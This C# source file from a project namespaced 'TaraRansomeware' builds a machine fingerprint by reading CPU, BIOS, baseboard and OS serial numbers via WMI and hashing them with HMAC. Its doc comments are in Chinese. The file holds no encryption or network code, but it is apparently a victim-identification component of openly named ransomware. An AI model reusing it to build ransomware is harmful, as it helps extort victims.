using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Macs;
using Org.BouncyCastle.Crypto.Parameters;
using System.Management;
using System.Text;

namespace TaraRansomeware.Utilities
{
    internal class GuidGenerator
    {
        /// <summary>
        /// 获取机器的唯一识别码
        /// </summary>
        /// <param name="digest">计算识别码使用的HASH函数</param>
        /// <returns>唯一识别码</returns>
        public static byte[] getHash(IDigest digest)
        {
            HMac hmac = new HMac(digest);
            byte[] resBuf = new byte[hmac.GetMacSize()];
            string m = ProcessorID() + BIOSSN() + BaseBoardSN();
            string k = "TaraRansomeware" + OperatingSN();

            hmac.Init(new KeyParameter(Encoding.UTF8.GetBytes(k)));
            hmac.BlockUpdate(Encoding.UTF8.GetBytes(m), 0, m.Length);
            hmac.DoFinal(resBuf, 0);

            return resBuf;
        }

        /// <summary>
        /// 获取操作系统的序列号
        /// </summary>
        /// <returns>操作系统的序列号</returns>
        public static string OperatingSN()
        {
            return FetchOneString("Win32_OperatingSystem", "SerialNumber");
        }

        /// <summary>
        /// 获取CPUID
        /// </summary>
        /// <returns>CPUID</returns>
        public static string ProcessorID()
        {
            return FetchOneString("Win32_Processor", "ProcessorId");
        }

        /// <summary>
        /// 获取主板序列号
        /// </summary>
        /// <returns>主板序列号</returns>
        public static string BaseBoardSN()
        {
            return FetchOneString("Win32_BaseBoard", "SerialNumber");
        }

        /// <summary>
        /// 获取BIOS序列号
        /// </summary>
        /// <returns>BIOS序列号</returns>
        public static string BIOSSN()
        {
            return FetchOneString("Win32_BIOS", "SerialNumber");
        }

        /// <summary>
        /// 获取信息的工具函数
        /// </summary>
        /// <param name="WMIPath">信息所在的WMI路径</param>
        /// <param name="key">信息的键名</param>
        /// <returns>信息</returns>
        private static string FetchOneString(string WMIPath, string key)
        {
            ManagementClass mc = new ManagementClass(WMIPath);
            ManagementObjectCollection moc = mc.GetInstances();
            string strID = null;
            foreach (ManagementObject mo in moc)
            {
                strID = mo.Properties[key].Value.ToString();
                break;
            }
            return strID;
        }
    }
}
